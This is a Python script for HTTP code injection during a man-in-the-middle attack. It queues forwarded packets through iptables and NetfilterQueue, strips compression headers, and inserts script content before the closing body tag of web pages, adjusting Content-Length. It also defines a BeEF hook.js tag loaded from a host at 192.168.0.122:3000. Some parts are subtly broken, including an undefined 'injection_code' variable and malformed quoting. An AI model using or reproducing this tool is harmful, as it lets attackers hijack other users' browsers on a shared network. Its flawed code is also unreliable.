from netfilterqueue import NetfilterQueue
import subprocess
import scapy.all as scapy
import re

# http == port 80

queue = NetfilterQueue()
script = open("test.html", "r")
script_beef = '"<script src="http://192.168.0.122:3000/hook.js"></script>"'


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw):

            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 80:
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                load = load.replace("</body>", script.read())
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

    except (UnicodeDecodeError, UnboundLocalError):
        pass
    packet.accept()


def set_load(packet, load):
    packet[scapy.Raw] = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def create_iptables_queue():
    print("[+]Creating iptables queue")
    subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    print("[+]Done")


queue.bind(1, process_packet)
try:
    create_iptables_queue()
    queue.run()
except KeyboardInterrupt:
    print("[+]Restoring iptables...")
    subprocess.run(["iptables", "--flush"])
    print("[+]Stopping web server")
    subprocess.run(["service", "apache2", "stop"])
    print("[+]Done")
